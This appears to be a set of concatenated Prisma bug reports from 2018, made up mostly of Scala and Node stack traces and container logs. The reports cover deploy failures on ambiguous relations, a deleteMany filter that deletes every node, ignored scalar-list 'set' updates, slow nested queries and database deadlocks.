"three-relations\\",\\"secrets\\":null,\\"types\\":\\"type a {\\\ id: id! @unique\\\ title: string\\\ b1: b @relation(name: \\\\\\"ab1\\\\\\")\\\ b2: b @relation(name: \\\\\\"ab2\\\\\\")\\\ b3: b @relation(name: \\\\\\"ab3\\\\\\")\\\ }\\\ \\\ type b {\\\ id: id
! @unique\\\ title: string\\\ a1: a @relation(name: \\\\\\"ab1\\\\\\")\\\ a2: a @relation(name: \\\\\\"ab2\\\\\\")\\\ a3: a @relation(name: \\\\\\"ab3\\\\\\")\\\ }\\\ \\\ \\",\\"s
ubscriptions\\":[]}","code":"0","stack_trace":"scala.predef$.require(predef.scala:277)\\\ com.prisma.shared.models.schema.getunambiguousrelationthatconnectsmodel
s_$bang(models.scala:114)\\\ com.prisma.deploy.migration.inference.schemainferrerimpl.$anonfun$nextrelations$8(schemainferrer.scala:158)\\\ scala.option.orelse(
option.scala:289)\\\ com.prisma.deploy.migration.inference.schemainferrerimpl.$anonfun$nextrelations$3(schemainferrer.scala:158)\\\ scala.collection.traversable
like$withfilter.$anonfun$map$2(traversablelike.scala:739)\\\ scala.collection.iterator.foreach(iterator.scala:929)\\\ scala.collection.iterator.foreach$(iterato
r.scala:929)\\\ scala.collection.abstractiterator.foreach(iterator.scala:1417)\\\ scala.collection.iterablelike.foreach(iterablelike.scala:71)\\\ scala.collecti
on.iterablelike.foreach$(iterablelike.scala:70)\\\ scala.collection.abstractiterable.foreach(iterable.scala:54)\\\ scala.collection.traversablelike$withfilter.m
ap(traversablelike.scala:738)\\\ com.prisma.deploy.migration.inference.schemainferrerimpl.$anonfun$nextrelations$1(schemainferrer.scala:116)\\\ scala.collection
.traversablelike.$anonfun$flatmap$1(traversablelike.scala:241)\\\ scala.collection.iterator.foreach(iterator.scala:929)\\\ scala.collection.iterator.foreach$(it
erator.scala:929)\\\ scala.collection.abstractiterator.foreach(iterator.scala:1417)\\\ scala.collection.iterablelike.foreach(iterablelike.scala:71)\\\ scala.col
lection.iterablelike.foreach$(iterablelike.scala:70)\\\ scala.collection.abstractiterable.foreach(iterable.scala:54)\\\ scala.collection.traversablelike.flatmap
(traversablelike.scala:241)\\\ scala.collection.traversablelike.flatmap$(traversablelike.scala:238)\\\ scala.collection.abstracttraversable.flatmap(traversable.scala:104)\\\ com.prisma.deploy.migration.inference.schemainferrerimpl.nextrelat
ions$lzycompute(schemainferrer.scala:115)\\\ com.prisma.deploy.migration.inference.schemainferrerimpl.nextrelations(schemainferrer.scala:113)\\\ com.prisma.depl
oy.migration.inference.schemainferrerimpl.$anonfun$fieldsfortype$1(schemainferrer.scala:78)\\\ scala.collection.traversablelike.$anonfun$flatmap$1(traversableli
ke.scala:241)\\\ scala.collection.iterator.foreach(iterator.scala:929)\\\ scala.collection.iterator.foreach$(iterator.scala:929)\\\ scala.collection.abstractite
rator.foreach(iterator.scala:1417)\\\ scala.collection.iterablelike.foreach(iterablelike.scala:71)\\\ scala.collection.iterablelike.foreach$(iterablelike.scala:
70)\\\ scala.collection.abstractiterable.foreach(iterable.scala:54)\\\ scala.collection.traversablelike.flatmap(traversablelike.scala:241)\\\ scala.collection.t
raversablelike.flatmap$(traversablelike.scala:238)\\\ scala.collection.abstracttraversable.flatmap(traversable.scala:104)\\\ com.prisma.deploy.migration.inference.schemainferrerimpl.fieldsfortype(schemainferrer.scala:71)\\\ com.prisma.deplo
y.migration.inference.schemainferrerimpl.$anonfun$nextmodels$1(schemainferrer.scala:49)\\\ scala.collection.traversablelike.$anonfun$map$1(traversablelike.scala
:234)\\\ scala.collection.iterator.foreach(iterator.scala:929)\\\ scala.collection.iterator.foreach$(iterator.scala:929)\\\ scala.collection.abstractiterator.fo
reach(iterator.scala:1417)\\\ scala.collection.iterablelike.foreach(iterablelike.scala:71)\\\ scala.collection.iterablelike.foreach$(iterablelike.scala:70)\\\ s
cala.collection.abstractiterable.foreach(iterable.scala:54)\\\ scala.collection.traversablelike.map(traversablelike.scala:234)\\\ scala.collection.traversableli
ke.map$(traversablelike.scala:227)\\\ scala.collection.abstracttraversable.map(traversable.scala:104)\\\ com.prisma.deploy.migration.inference.schemainferrerimp
l.nextmodels$lzycompute(schemainferrer.scala:48)\\\ com.prisma.deploy.migration.inference.schemainferrerimpl.nextmodels(schemainferrer.scala:47)\\\ com.prisma.deploy.migration.inference.schemainferrerimpl.infer(schemainferrer.scala:37)\\\ c
om.prisma.deploy.migration.inference.schemainferrer$$anon$1.infer(schemainferrer.scala:22)\\\ com.prisma.deploy.schema.mutations.deploymutation.performdeploymen
t(deploymutation.scala:60)\\\ com.prisma.deploy.schema.mutations.deploymutation.execute(deploymutation.scala:53)\\\ com.prisma.deploy.schema.schemabuilderimpl.$
anonfun$deployfield$7(schemabuilder.scala:187)\\\ scala.concurrent.future.$anonfun$flatmap$1(future.scala:302)\\\ scala.concurrent.impl.promise.$anonfun$transfo
rmwith$1(promise.scala:37)\\\ scala.concurrent.impl.callbackrunnable.run(promise.scala:60)\\\ akka.dispatch.batchingexecutor$abstractbatch.processbatch(batching
executor.scala:55)\\\ akka.dispatch.batchingexecutor$blockablebatch.$anonfun$run$1(batchingexecutor.scala:91)\\\ scala.runtime.java8.jfunction0$mcv$sp.apply(jfu
nction0$mcv$sp.java:12)\\\ scala.concurrent.blockcontext$.withblockcontext(blockcontext.scala:81)\\\ akka.dispatch.batchingexecutor$blockablebatch.run(batchingexecutor.scala:91)\\\ akka.dispatch.taskinvocation.run(abstractdispatcher.scala:4
0)\\\ akka.dispatch.forkjoinexecutorconfigurator$akkaforkjointask.exec(forkjoinexecutorconfigurator.scala:43)\\\ akka.dispatch.forkjoin.forkjointask.doexec(fork
jointask.java:260)\\\ akka.dispatch.forkjoin.forkjoinpool$workqueue.runtask(forkjoinpool.java:1339)\\\ akka.dispatch.forkjoin.forkjoinpool.runworker(forkjoinpoo
l.java:1979)\\\ akka.dispatch.forkjoin.forkjoinworkerthread.run(forkjoinworkerthread.java:107)","message":"requirement failed: this method must only be called f
or unambiguous relations!"}}
prisma-database_1 | at com.prisma.deploy.migration.inference.schemainferrerimpl.$anonfun$nextrelations$8(schemainferrer.scala:158)
prisma-database_1 | at scala.option.orelse(option.scala:289)
prisma-database_1 | at com.prisma.deploy.migration.inference.schemainferrerimpl.$anonfun$nextrelations$3(schemainferrer.scala:158)
prisma-database_1 | at scala.collection.traversablelike$withfilter.$anonfun$map$2(traversablelike.scala:739)
prisma-database_1 | at scala.collection.iterator.foreach(iterator.scala:929)prisma-database_1 | at scala.collection.iterator.foreach$(iterator.scala:929)
prisma-database_1 | at scala.collection.abstractiterator.foreach(iterator.scala:1417)
prisma-database_1 | at scala.collection.iterablelike.foreach(iterablelike.scala:71)
prisma-database_1 | at scala.collection.iterablelike.foreach$(iterablelike.scala:70)
prisma-database_1 | at scala.collection.abstractiterable.foreach(iterable.scala:54)
prisma-database_1 | at scala.collection.traversablelike$withfilter.map(traversablelike.scala:738)
prisma-database_1 | at com.prisma.deploy.migration.inference.schemainferrerimpl.$anonfun$nextrelations$1(schemainferrer.scala:116)
prisma-database_1 | at scala.collection.traversablelike.$anonfun$flatmap$1(traversablelike.scala:241)
prisma-database_1 | at scala.collection.iterator.foreach(iterator.scala:929)prisma-database_1 | at scala.collection.iterator.foreach$(iterator.scala:929)
prisma-database_1 | at scala.collection.abstractiterator.foreach(iterator.scala:1417)
prisma-database_1 | at scala.collection.iterablelike.foreach(iterablelike.scala:71)
prisma-database_1 | at scala.collection.iterablelike.foreach$(iterablelike.scala:70)
prisma-database_1 | at scala.collection.abstractiterable.foreach(iterable.scala:54)
prisma-database_1 | at scala.collection.traversablelike.flatmap(traversablelike.scala:241)
prisma-database_1 | at scala.collection.traversablelike.flatmap$(traversablelike.scala:238)
prisma-database_1 | at scala.collection.abstracttraversable.flatmap(traversable.scala:104)
prisma-database_1 | at com.prisma.deploy.migration.inference.schemainferrerimpl.nextrelations$lzycompute(schemainferrer.scala:115)
prisma-database_1 | at com.prisma.deploy.migration.inference.schemainferrerimpl.nextrelations(schemainferrer.scala:113)
prisma-database_1 | at com.prisma.deploy.migration.inference.schemainferrerimpl.$anonfun$fieldsfortype$1(schemainferrer.scala:78)
prisma-database_1 | at scala.collection.traversablelike.$anonfun$flatmap$1(traversablelike.scala:241)
prisma-database_1 | at scala.collection.iterator.foreach(iterator.scala:929)prisma-database_1 | at scala.collection.iterator.foreach$(iterator.scala:929)
prisma-database_1 | at scala.collection.abstractiterator.foreach(iterator.scala:1417)
prisma-database_1 | at scala.collection.iterablelike.foreach(iterablelike.scala:71)
prisma-database_1 | at scala.collection.iterablelike.foreach$(iterablelike.scala:70)
prisma-database_1 | at scala.collection.abstractiterable.foreach(iterable.scala:54)
prisma-database_1 | at scala.collection.traversablelike.flatmap(traversablelike.scala:241)
prisma-database_1 | at scala.collection.traversablelike.flatmap$(traversablelike.scala:238)
prisma-database_1 | at scala.collection.abstracttraversable.flatmap(traversable.scala:104)
prisma-database_1 | at com.prisma.deploy.migration.inference.schemainferrerimpl.fieldsfortype(schemainferrer.scala:71)
prisma-database_1 | at com.prisma.deploy.migration.inference.schemainferrerimpl.$anonfun$nextmodels$1(schemainferrer.scala:49)
prisma-database_1 | at scala.collection.traversablelike.$anonfun$map$1(traversablelike.scala:234)
prisma-database_1 | at scala.collection.iterator.foreach(iterator.scala:929)prisma-database_1 | at scala.collection.iterator.foreach$(iterator.scala:929)
prisma-database_1 | at scala.collection.abstractiterator.foreach(iterator.scala:1417)
prisma-database_1 | at scala.collection.iterablelike.foreach(iterablelike.scala:71)
prisma-database_1 | at scala.collection.iterablelike.foreach$(iterablelike.scala:70)
prisma-database_1 | at scala.collection.abstractiterable.foreach(iterable.scala:54)
prisma-database_1 | at scala.collection.traversablelike.map(traversablelike.scala:234)
prisma-database_1 | at scala.collection.iterator.foreach(iterator.scala:929)
prisma-database_1 | at scala.collection.iterator.foreach$(iterator.scala:929)
prisma-database_1 | at scala.collection.abstractiterator.foreach(iterator.scala:1417)
prisma-database_1 | at scala.collection.iterablelike.foreach(iterablelike.scala:71)
prisma-database_1 | at scala.collection.iterablelike.foreach$(iterablelike.scala:70)
prisma-database_1 | at scala.collection.abstractiterable.foreach(iterable.scala:54)
prisma-database_1 | at scala.collection.traversablelike.flatmap(traversablelike.scala:241)
prisma-database_1 | at scala.collection.traversablelike.flatmap$(traversablelike.scala:238)
prisma-database_1 | at scala.collection.abstracttraversable.flatmap(traversable.scala:104)
prisma-database_1 | at com.prisma.deploy.migration.inference.schemainferrerimpl.nextrelations$lzycompute(schemainferrer.scala:115)
prisma-database_1 | at com.prisma.deploy.migration.inference.schemainferrerimpl.nextrelations(schemainferrer.scala:113)
prisma-database_1 | at com.prisma.deploy.migration.inference.schemainferrerimpl.$anonfun$fieldsfortype$1(schemainferrer.scala:78)
prisma-database_1 | at scala.collection.traversablelike.$anonfun$flatmap$1(traversablelike.scala:241)
prisma-database_1 | at scala.collection.iterator.foreach(iterator.scala:929)
prisma-database_1 | at scala.collection.iterator.foreach$(iterator.scala:929)
prisma-database_1 | at scala.collection.abstractiterator.foreach(iterator.scala:1417)
prisma-database_1 | at scala.collection.iterablelike.foreach(iterablelike.scala:71)
prisma-database_1 | at scala.collection.iterablelike.foreach$(iterablelike.scala:70)
prisma-database_1 | at scala.collection.abstractiterable.foreach(iterable.scala:54)
prisma-database_1 | at scala.collection.traversablelike.flatmap(traversablelike.scala:241)
prisma-database_1 | at scala.collection.traversablelike.flatmap$(traversablelike.scala:238)
prisma-database_1 | at scala.collection.abstracttraversable.flatmap(traversable.scala:104)
prisma-database_1 | at com.prisma.deploy.migration.inference.schemainferrerimpl.fieldsfortype(schemainferrer.scala:71)
prisma-database_1 | at com.prisma.deploy.migration.inference.schemainferrerimpl.$anonfun$nextmodels$1(schemainferrer.scala:49)
prisma-database_1 | at scala.collection.traversablelike.$anonfun$map$1(traversablelike.scala:234)
prisma-database_1 | at scala.collection.iterator.foreach(iterator.scala:929)
prisma-database_1 | at scala.collection.iterator.foreach$(iterator.scala:929)
prisma-database_1 | at scala.collection.abstractiterator.foreach(iterator.scala:1417)
prisma-database_1 | at scala.collection.iterablelike.foreach(iterablelike.scala:71)
prisma-database_1 | at scala.collection.iterablelike.foreach$(iterablelike.scala:70)
prisma-database_1 | at scala.collection.abstractiterable.foreach(iterable.scala:54)
prisma-database_1 | at scala.collection.traversablelike.map(traversablelike.scala:234)
prisma-database_1 | at scala.collection.traversablelike.map$(traversablelike.scala:227)
prisma-database_1 | at scala.collection.abstracttraversable.map(traversable.scala:104)
prisma-database_1 | at com.prisma.deploy.migration.inference.schemainferrerimpl.nextmodels$lzycompute(schemainferrer.scala:48)
prisma-database_1 | at com.prisma.deploy.migration.inference.schemainferrerimpl.nextmodels(schemainferrer.scala:47)
prisma-database_1 | at com.prisma.deploy.migration.inference.schemainferrerimpl.infer(schemainferrer.scala:37)
prisma-database_1 | at com.prisma.deploy.migration.inference.schemainferrer$$anon$1.infer(schemainferrer.scala:22)
prisma-database_1 | at com.prisma.deploy.schema.mutations.deploymutation.performdeployment(deploymutation.scala:60)
prisma-database_1 | at com.prisma.deploy.schema.mutations.deploymutation.execute(deploymutation.scala:53)
prisma-database_1 | at com.prisma.deploy.schema.schemabuilderimpl.$anonfun$deployfield$7(schemabuilder.scala:187)
prisma-database_1 | at scala.concurrent.future.$anonfun$flatmap$1(future.scala:302)
prisma-database_1 | at scala.concurrent.impl.promise.$anonfun$transformwith$1(promise.scala:37)
prisma-database_1 | at scala.concurrent.impl.callbackrunnable.run(promise.scala:60)
prisma-database_1 | at akka.dispatch.batchingexecutor$abstractbatch.processbatch(batchingexecutor.scala:55)
prisma-database_1 | at akka.dispatch.batchingexecutor$blockablebatch.$anonfun$run$1(batchingexecutor.scala:91)
prisma-database_1 | at scala.runtime.java8.jfunction0$mcv$sp.apply(jfunction0$mcv$sp.java:12)
prisma-database_1 | at scala.concurrent.blockcontext$.withblockcontext(blockcontext.scala:81)
prisma-database_1 | at akka.dispatch.batchingexecutor$blockablebatch.run(batchingexecutor.scala:91)
prisma-database_1 | at akka.dispatch.taskinvocation.run(abstractdispatcher.scala:40)
prisma-database_1 | at akka.dispatch.forkjoinexecutorconfigurator$akkaforkjointask.exec(forkjoinexecutorconfigurator.scala:43)
prisma-database_1 | at akka.dispatch.forkjoin.forkjointask.doexec(forkjointask.java:260)
prisma-database_1 | at akka.dispatch.forkjoin.forkjoinpool$workqueue.runtask(forkjoinpool.java:1339)
prisma-database_1 | at akka.dispatch.forkjoin.forkjoinpool.runworker(forkjoinpool.java:1979)
prisma-database_1 | at akka.dispatch.forkjoin.forkjoinworkerthread.run(forkjoinworkerthread.java:107)
prisma-database_1 | [bugsnag - local / testing] error report: com.bugsnag.report@29ad5ef3
prisma-database_1 | {"@timestamp":"2018-03-20t16:29:48.807+00:00","@version":1,"message":"{\\"key\\":\\"request/complete\\",\\"requestid\\":\\"cluster:cluster:cjezvk0nk00190135wc9
abixm\\",\\"payload\\":{\\"request_duration\\":\\"54\\"}}","logger_name":"com.prisma.deploy.server.clusterserver","thread_name":"single-server-akka.actor.default-dispatcher-2","lev
el":"info","level_value":20000,"hostname":"9b814d9be711"}
prisma-database_1 | {"@timestamp":"2018-03-20t16:30:51.458+00:00","@version":1,"message":"{\\"key\\":\\"request/new\\",\\"requestid\\":\\"cluster:cluster:cjezvld1d001a0135n1ht53ys
\\"}","logger_name":"com.prisma.deploy.server.clusterserver","thread_name":"single-server-akka.actor.default-dispatcher-18","level":"info","level_value":20000,"hostname":"9b8
14d9be711"}
prisma-database_1 | {"@timestamp":"2018-03-20t16:30:51.463+00:00","@version":1,"message":"{\\"key\\":\\"request/complete\\",\\"requestid\\":\\"cluster:cluster:cjezvld1d001a0135n1h
t53ys\\",\\"payload\\":{\\"request_duration\\":\\"5\\"}}","logger_name":"com.prisma.deploy.server.clusterserver","thread_name":"single-server-akka.actor.default-dispatcher-16","lev
el":"info","level_value":20000,"hostname":"9b814d9be711"}
when including a type (as a to-one relation) that only has an id field (or an id field and a relation), i get an error on `prisma deploy`: ```sh
hooks: checking, if schema file changed..
client introspecting transform-server dev +509ms !
syntax error: expected name, found } graphql request (1001:1)
1000: 1001: } ^
1002: at syntaxerror (/usr/local/lib/node_modules/prisma/node_modules/graphql/error/syntaxerror.js:24:10) at expect (/usr/local/lib/node_modules/prisma/node_modules/graphql/language/parser.js:1299:32) at parsename (/usr/local/lib/node_modules/prisma/node_modules/graphql/language/parser.js:92:15) at parseinputvaluedef (/usr/local/lib/node_modules/prisma/node_modules/graphql/language/parser.js:842:14) at many (/usr/local/lib/node_modules/prisma/node_modules/graphql/language/parser.js:1348:16) at parseinputfieldsdefinition (/usr/local/lib/node_modules/prisma/node_modules/graphql/language/parser.js:992:50) at parseinputobjecttypedefinition (/usr/local/lib/node_modules/prisma/node_modules/graphql/language/parser.js:977:16) at parsetypesystemdefinition (/usr/local/lib/node_modules/prisma/node_modules/graphql/language/parser.js:671:16) at parsedefinition (/usr/local/lib/node_modules/prisma/node_modules/graphql/language/parser.js:143:16) at parsedocument (/usr/local/lib/node_modules/prisma/node_modules/graphql/language/parser.js:110:22) at object.parse (/usr/local/lib/node_modules/prisma/node_modules/graphql/language/parser.js:38:10) at object.<anonymous> (/usr/local/lib/node_modules/prisma/node_modules/prisma-cli-core/src/commands/deploy/printschema.ts:30:20) at step (/usr/local/lib/node_modules/prisma/node_modules/prisma-cli-core/dist/commands/deploy/printschema.js:32:23) at object.next (/usr/local/lib/node_modules/prisma/node_modules/prisma-cli-core/dist/commands/deploy/printschema.js:13:53) at fulfilled (/usr/local/lib/node_modules/prisma/node_modules/prisma-cli-core/dist/commands/deploy/printschema.js:4:58) at <anonymous> at process._tickdomaincallback (internal/process/next_tick.js:228:7)
exiting with code: 1
davids-macbook-pro-2:transform-server davidyoung$ ```
`prisma cluster logs` does not display logs for local clusters.
when running this code
mutation { deletemanytrips( where: { ticket: null } ) { count }
it will delete every node, in this case, `trips`
while using the same query like this:
{ trips( where: { ticket:null } ) { ticket { id } }
will return the `trips` that have `ticket` as `null`
when i deploy primsa (v1.3.5) via docker-compose and set the environment sql_internal_database to something else then graphcool this will not be picked up by the prisma bootstrapping process for a new not
:query is: create schema if not exists `graphcool` default character set latin1;[1]: at org.mariadb.jdbc.internal.util.logquerytool.exceptionwithquery(logquerytool.java:146)[1]: at org.mariadb.jdbc.internal.protocol.abstractqueryprotocol.executequery(abstractqueryprotocol.java:217)[1]: at org.mariadb.jdbc.mariadbpreparedstatementclient.executeinternal(mariadbpreparedstatementclient.java:218)[1]:
24 more[1]:listening for transport dt_socket at address: 8000
i am facing some performance issues with prisma queries when trying to get data 4 level deep
logs for prisma container shows that it takes anywhere between 5-25 seconds (depending upon traffic) to respond and all my other requests are blocked till that query is resolved
container logs: ```
{"@timestamp":"2018-03-13t08:00:42.321+00:00","@version":1,"message":"{\\"key\\":\\"request/complete\\",\\"requestid\\":\\"api:api:cjepda4nb04rz0106fubesa30\\",\\"projectid\\":\\"example@dev\\",\\"payload\\":{\\"request_duration\\":\\"9802\\",\\"throttled_by\\":\\"0\\"}}","logger_name":"com.prisma.api.server.apiserver","thread_name":"single-server-akka.actor.default-dispatcher-27","level":"info","level_value":20000,"hostname":"fa6e13eba3d6"}
{"@timestamp":"2018-03-13t08:00:43.197+00:00","@version":1,"message":"{\\"key\\":\\"request/complete\\",\\"requestid\\":\\"api:api:cjepda4nz04s101064sop1p4y\\",\\"projectid\\":\\"example@dev\\",\\"payload\\":{\\"request_duration\\":\\"10654\\",\\"throttled_by\\":\\"0\\"}}","logger_name":"com.prisma.api.server.apiserver","thread_name":"single-server-akka.actor.default-dispatcher-32","level":"info","level_value":20000,"hostname":"fa6e13eba3d6"}
{"@timestamp":"2018-03-13t08:00:45.509+00:00","@version":1,"message":"{\\"key\\":\\"request/complete\\",\\"requestid\\":\\"api:api:cjepda1xl04go0106vkytwycr\\",\\"projectid\\":\\"example@dev\\",\\"payload\\":{\\"request_duration\\":\\"16508\\",\\"throttled_by\\":\\"0\\"}}","logger_name":"com.prisma.api.server.apiserver","thread_name":"single-server-akka.actor.default-dispatcher-2","level":"info","level_value":20000,"hostname":"fa6e13eba3d6"}
{"@timestamp":"2018-03-13t08:00:45.716+00:00","@version":1,"message":"{\\"key\\":\\"request/complete\\",\\"requestid\\":\\"api:api:cjepda4ju04rr0106ta5yr2w6\\",\\"projectid\\":\\"example@dev\\",\\"payload\\":{\\"request_duration\\":\\"13322\\",\\"throttled_by\\":\\"0\\"}}","logger_name":"com.prisma.api.server.apiserver","thread_name":"single-server-akka.actor.default-dispatcher-28","level":"info","level_value":20000,"hostname":"fa6e13eba3d6"}
{"@timestamp":"2018-03-13t08:00:47.190+00:00","@version":1,"message":"{\\"key\\":\\"request/complete\\",\\"requestid\\":\\"api:api:cjepda2b804ii010625yhyiyi\\",\\"projectid\\":\\"example@dev\\",\\"payload\\":{\\"request_duration\\":\\"17698\\",\\"throttled_by\\":\\"0\\"}}","logger_name":"com.prisma.api.server.apiserver","thread_name":"single-server-akka.actor.default-dispatcher-4","level":"info","level_value":20000,"hostname":"fa6e13eba3d6"}
{"@timestamp":"2018-03-13t08:00:48.913+00:00","@version":1,"message":"{\\"key\\":\\"request/complete\\",\\"requestid\\":\\"api:api:cjepda4ym04st0106nbnn33hd\\",\\"projectid\\":\\"example@dev\\",\\"payload\\":{\\"request_duration\\":\\"15987\\",\\"throttled_by\\":\\"0\\"}}","logger_name":"com.prisma.api.server.apiserver","thread_name":"single-server-akka.actor.default-dispatcher-4","level":"info","level_value":20000,"hostname":"fa6e13eba3d6"}
{"@timestamp":"2018-03-13t08:00:49.183+00:00","@version":1,"message":"{\\"key\\":\\"request/complete\\",\\"requestid\\":\\"api:api:cjepda4m504ry0106orkpu253\\",\\"projectid\\":\\"example@dev\\",\\"payload\\":{\\"request_duration\\":\\"16706\\",\\"throttled_by\\":\\"0\\"}}","logger_name":"com.prisma.api.server.apiserver","thread_name":"single-server-akka.actor.default-dispatcher-15","level":"info","level_value":20000,"hostname":"fa6e13eba3d6"}
{"@timestamp":"2018-03-13t08:00:50.612+00:00","@version":1,"message":"{\\"key\\":\\"request/complete\\",\\"requestid\\":\\"api:api:cjepda4lf04rs0106obg23azz\\",\\"projectid\\":\\"example@dev\\",\\"payload\\":{\\"request_duration\\":\\"18161\\",\\"throttled_by\\":\\"0\\"}}","logger_name":"com.prisma.api.server.apiserver","thread_name":"single-server-akka.actor.default-dispatcher-29","level":"info","level_value":20000,"hostname":"fa6e13eba3d6"}
{"@timestamp":"2018-03-13t08:00:50.707+00:00","@version":1,"message":"{\\"key\\":\\"request/complete\\",\\"requestid\\":\\"api:api:cjepda2b704ig01062xygadxd\\",\\"projectid\\":\\"example@dev\\",\\"payload\\":{\\"request_duration\\":\\"21216\\",\\"throttled_by\\":\\"0\\"}}","logger_name":"com.prisma.api.server.apiserver","thread_name":"single-server-akka.actor.default-dispatcher-2","level":"info","level_value":20000,"hostname":"fa6e13eba3d6"}
{"@timestamp":"2018-03-13t08:00:51.740+00:00","@version":1,"message":"{\\"key\\":\\"request/complete\\",\\"requestid\\":\\"api:api:cjepda39604m60106zbqfrn1q\\",\\"projectid\\":\\"example@dev\\",\\"payload\\":{\\"request_duration\\":\\"21026\\",\\"throttled_by\\":\\"0\\"}}","logger_name":"com.prisma.api.server.apiserver","thread_name":"single-server-akka.actor.default-dispatcher-4","level":"info","level_value":20000,"hostname":"fa6e13eba3d6"}
``` also, prisma container throws following error when i run load test for above query with concurrency of 2 requests and rate of 10 requests per second: ```
java.util.concurrent.rejectedexecutionexception: task slick.basic.basicbackend$databasedef$$anon$2@4fac748b rejected from slick.util.asyncexecutor$$anon$2$$anon$1@3ce74e20[running, pool size = 10, active threads = 10, queued tasks = 1000, completed tasks = 85606] at java.util.concurrent.threadpoolexecutor$abortpolicy.rejectedexecution(threadpoolexecutor.java:2063) at java.util.concurrent.threadpoolexecutor.reject(threadpoolexecutor.java:830) at java.util.concurrent.threadpoolexecutor.execute(threadpoolexecutor.java:1379) at slick.util.asyncexecutor$$anon$2$$anon$3.execute(asyncexecutor.scala:120) at slick.basic.basicbackend$databasedef.runsynchronousdatabaseaction(basicbackend.scala:233) at slick.basic.basicbackend$databasedef.runsynchronousdatabaseaction$(basicbackend.scala:231) at slick.jdbc.jdbcbackend$databasedef.runsynchronousdatabaseaction(jdbcbackend.scala:38) at slick.basic.basicbackend$databasedef.runincontext(basicbackend.scala:210) at slick.basic.basicbackend$databasedef.runincontext$(basicbackend.scala:142) at slick.jdbc.jdbcbackend$databasedef.runincontext(jdbcbackend.scala:38) at slick.basic.basicbackend$databasedef.runinternal(basicbackend.scala:78) at slick.basic.basicbackend$databasedef.runinternal$(basicbackend.scala:77) at slick.jdbc.jdbcbackend$databasedef.runinternal(jdbcbackend.scala:38) at slick.basic.basicbackend$databasedef.run(basicbackend.scala:75) at slick.basic.basicbackend$databasedef.run$(basicbackend.scala:75) at slick.jdbc.jdbcbackend$databasedef.run(jdbcbackend.scala:38) at com.prisma.api.database.dataresolver.$anonfun$resolvebyrelationmanymodels$1(dataresolver.scala:172) at com.prisma.metrics.timermetric.timefuture(metrics.scala:110) at com.prisma.api.database.dataresolver.performwithtiming(dataresolver.scala:38) at com.prisma.api.database.dataresolver.resolvebyrelationmanymodels(dataresolver.scala:174) at com.prisma.api.database.deferreds.toonedeferredresolver.resolve(toonedeferredresolver.scala:24) at com.prisma.api.database.deferreds.deferredresolverprovider.$anonfun$resolve$6(deferredresolverprovider.scala:139) at scala.collection.traversablelike.$anonfun$map$1(traversablelike.scala:234) at scala.collection.immutable.map$map1.foreach(map.scala:120) at scala.collection.traversablelike.map(traversablelike.scala:234) at scala.collection.traversablelike.map$(traversablelike.scala:227) at scala.collection.abstracttraversable.map(traversable.scala:104) at com.prisma.api.database.deferreds.deferredresolverprovider.resolve(deferredresolverprovider.scala:137) at sangria.execution.resolver.sangria$execution$resolver$$resolvedeferred(resolver.scala:766)
``` this issue is blocking us from deploying application to production
**versions:**
prisma: 1.3.2
prisma-binding: 1.5.6
graphql-yoga: 1.2.0
i\'ve noticed that when i try to `set` a `scalar list` [here, `sugar`] during an update mutation it does not *"override the existing list with an entirely new list."* as mentioned [here]( #updating-nodes)
so, when i do something like so:
# let\'s say, for simplicity that sugar === ["i don\'t know", "maybe", "perhaps", "who knows"]
data: { sugar: { set: ["yes", "no"] || [] }
`sugar` [scalar list of strings] returns
```javascript
sugar: ["yes", "no", "perhaps", "who knows"]
running nested mutations in quick succession results in an internal server error, and this cluster log: ```
prisma-database_1 | java.sql.sqltransactionrollbackexception: (conn=164) deadlock found when trying to get lock; try restarting transaction
prisma-database_1 | at org.mariadb.jdbc.internal.util.exceptions.exceptionmapper.get(exceptionmapper.java:165)
prisma-database_1 | at org.mariadb.jdbc.internal.util.exceptions.exceptionmapper.getexception(exceptionmapper.java:106)
prisma-database_1 | at org.mariadb.jdbc.mariadbstatement.executeexceptionepilogue(mariadbstatement.java:235)
prisma-database_1 | at org.mariadb.jdbc.mariadbpreparedstatementclient.executeinternal(mariadbpreparedstatementclient.java:224)
prisma-database_1 | at org.mariadb.jdbc.mariadbpreparedstatementclient.execute(mariadbpreparedstatementclient.java:159)
prisma-database_1 | at com.zaxxer.hikari.pool.proxypreparedstatement.execute(proxypreparedstatement.java:44)
prisma-database_1 | at com.zaxxer.hikari.pool.hikariproxypreparedstatement.execute(hikariproxypreparedstatement.java)
prisma-database_1 | at slick.jdbc.statementinvoker.results(statementinvoker.scala:39)
prisma-database_1 | at slick.jdbc.statementinvoker.iteratorto(statementinvoker.scala:22)
prisma-database_1 | at slick.jdbc.invoker.first(invoker.scala:31)
prisma-database_1 | at slick.jdbc.invoker.first$(invoker.scala:30)
prisma-database_1 | at slick.jdbc.statementinvoker.first(statementinvoker.scala:16)
prisma-database_1 | at slick.jdbc.streaminginvokeraction$headaction.run(streaminginvokeraction.scala:52)
prisma-database_1 | at slick.jdbc.streaminginvokeraction$headaction.run(streaminginvokeraction.scala:51)
prisma-database_1 | at slick.dbio.dbioaction$$anon$4.$anonfun$run$3(dbioaction.scala:240)
prisma-database_1 | at scala.collection.iterator.foreach(iterator.scala:929)prisma-database_1 | at scala.collection.iterator.foreach$(iterator.scala:929)
prisma-database_1 | at scala.collection.abstractiterator.foreach(iterator.scala:1417)
prisma-database_1 | at scala.collection.iterablelike.foreach(iterablelike.scala:71)
prisma-database_1 | at scala.collection.iterablelike.foreach$(iterablelike.scala:70)
prisma-database_1 | at scala.collection.abstractiterable.foreach(iterable.scala:54)
prisma-database_1 | at slick.dbio.dbioaction$$anon$4.run(dbioaction.scala:240)
prisma-database_1 | at slick.dbio.dbioaction$$anon$4.run(dbioaction.scala:238)
prisma-database_1 | at slick.dbio.dbioaction$$anon$4.$anonfun$run$3(dbioaction.scala:240)
prisma-database_1 | at scala.collection.iterator.foreach(iterator.scala:929)prisma-database_1 | at scala.collection.iterator.foreach$(iterator.scala:929)
prisma-database_1 | at scala.collection.abstractiterator.foreach(iterator.scala:1417)
prisma-database_1 | at scala.collection.iterablelike.foreach(iterablelike.scala:71)
prisma-database_1 | at scala.collection.iterablelike.foreach$(iterablelike.scala:70)
prisma-database_1 | at scala.collection.abstractiterable.foreach(iterable.scala:54)
prisma-database_1 | at slick.dbio.dbioaction$$anon$4.run(dbioaction.scala:240)
prisma-database_1 | at slick.dbio.dbioaction$$anon$4.run(dbioaction.scala:238)
prisma-database_1 | at slick.dbio.synchronousdatabaseaction$fusedandthenaction.$anonfun$run$4(dbioaction.scala:534)
